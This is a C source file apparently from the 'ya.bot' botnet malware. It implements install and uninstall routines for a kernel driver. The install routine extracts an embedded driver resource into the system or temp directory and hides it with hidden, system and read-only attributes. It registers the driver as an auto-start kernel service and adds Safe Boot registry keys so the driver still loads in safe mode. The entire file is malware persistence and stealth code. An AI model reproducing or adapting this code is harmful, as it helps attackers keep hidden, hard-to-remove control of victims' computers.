/*  ya.bot  */

#include "..\bot.h"

#ifndef NO_INSTALLDRIVER
bool install_driver()
{
	char szFilePath[MAX_PATH], szSystemDirectory[MAX_PATH];

#ifndef NO_DEBUG
		debug_print("Installing driver, install_driver()");
#endif

	if (botinstallasservice)
	{
		if (!GetSystemDirectory(szSystemDirectory, sizeof(szSystemDirectory) - 1))
				return FALSE;
			_snprintf(szFilePath, sizeof(szFilePath) - 1,
					string_filepath,
					szSystemDirectory,
					driverfilename);
	}
	else
	{
		if (!GetTempPath(sizeof(szFilePath) - 1, szFilePath))
				return FALSE;
			strncat(szFilePath,
					(char *)driverfilename,
					(sizeof(szFilePath) - strlen(szFilePath)) - 1);
	}
	if (file_exists((char *)szFilePath))
			return FALSE;
	if (!file_extractresource((char *)string_installdriverresourcename,
				(char *)string_installresourcetype,
				szFilePath)) return FALSE;
		SetFileAttributes(szFilePath,
				FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);
	if (!service_install((char *)driverservicename,
				szFilePath,
				SERVICE_KERNEL_DRIVER,
				SERVICE_AUTO_START,
				TRUE)) return FALSE;
		registry_createkey(HKEY_LOCAL_MACHINE,
				(char *)string_installregistrysafebootminimal,
				(char *)driverservicename);
		registry_createkey(HKEY_LOCAL_MACHINE,
				(char *)string_installregistrysafebootnetwork,
				(char *)driverservicename);
		return TRUE;
}

bool uninstall_driver()
{
	char szFilePath[MAX_PATH], szSystemDirectory[MAX_PATH];

#ifndef NO_DEBUG
		debug_print("Uninstalling driver, uninstall_driver()");
#endif

	if (botinstallasservice)
	{
		if (!GetSystemDirectory(szSystemDirectory, sizeof(szSystemDirectory) - 1))
				return FALSE;
			_snprintf(szFilePath, sizeof(szFilePath) - 1,
					string_filepath,
					szSystemDirectory,
					driverfilename);
	}
	else
	{
		if (!GetTempPath(sizeof(szFilePath) - 1, szFilePath))
				return FALSE;
			strncat(szFilePath,
					(char *)driverfilename,
					(sizeof(szFilePath) - strlen(szFilePath)) - 1);
	}
		SetFileAttributes(szFilePath, FILE_ATTRIBUTE_NORMAL);
	if (!service_uninstall((char *)driverservicename))
			return FALSE;
		registry_deletekey(HKEY_LOCAL_MACHINE,
				(char *)string_installregistrysafebootminimal,
				(char *)driverservicename);
		registry_deletekey(HKEY_LOCAL_MACHINE,
				(char *)string_installregistrysafebootnetwork,
				(char *)driverservicename);
	if (!file_delete(szFilePath))
			return FALSE;
		return TRUE;
}
#endif